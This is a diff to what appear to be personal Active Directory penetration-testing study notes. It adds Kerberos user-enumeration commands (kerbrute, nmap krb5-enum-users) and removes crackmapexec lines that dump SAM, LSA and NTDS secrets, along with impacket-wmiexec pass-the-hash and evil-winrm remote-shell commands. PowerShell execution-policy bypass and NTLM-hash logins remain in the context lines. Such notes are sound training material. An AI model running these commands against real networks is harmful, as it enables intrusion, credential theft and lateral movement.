@@ -36,6 +36,13 @@ Name(domain name)       : corp.com
 PowerView.ps1:
 Get-NetDomain
 ```
+Active Directory User Enumeration
+```
+./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases
+
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
+Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
+```
 ###### Nested Groups
 ```
 powershell -ep bypass
@@ -263,13 +270,6 @@ proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com(if this 
 
 smb(-x requires admin privilege):
 for impacket-psexec.py to have shell by smb, Admin$ or C$ need to be writable
-cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
-cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
-cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
-cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
-cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
-cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
-cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 proxychains4 -f /etc/proxychains4.conf smbclient //172.16.196.13/IPC$(sharename) -U offsec%lab
 
 mssql:
@@ -281,16 +281,6 @@ cme protocol ip.txt -u user1 user2 user3 -p pass1 pass2 pass3
 winrm:
 cme winrm ip -u celia.almeda -H ntlm_hash
 cme winrm ip -u celia.almeda -p password
-```
-###### WMI(Remote Procedure Calls (RPC)2 over port 135)
-```
-/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
-/usr/bin/impacket-wmiexec domain/Administrator:password@192.168.50.73
-```
-###### Winrm(domain user needs to be part of the Administrators or Remote Management Users group on the target host,5985,5986)
-```
-evil-winrm -i ip -u username -p password
-evil-winrm -i ip -u username -H ntlm_hash
 ```
 
 ###### Dump the local password hash and domain cached hash
